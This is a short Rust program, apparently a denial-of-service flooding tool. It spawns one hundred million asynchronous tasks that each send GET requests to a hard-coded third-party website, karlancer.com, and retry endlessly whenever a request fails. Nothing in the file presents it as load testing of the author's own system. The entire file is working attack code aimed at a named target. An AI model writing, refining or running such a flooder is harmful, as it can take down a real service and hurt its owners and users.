use reqwest::Client;
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let url = "https://karlancer.com";
    let request_count = 100_000_000;

    let mut handles = vec![];

    for _ in 0..request_count {
        let client = client.clone();
        let url = url.to_string();
        let handle = tokio::spawn(async move {
            while let Err(err) = client.get(&url).send().await {
                eprintln!("Request error: {}", err);
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        if let Err(err) = handle.await {
            eprintln!("Handle error: {}", err);
        }
    }

    Ok(())
}
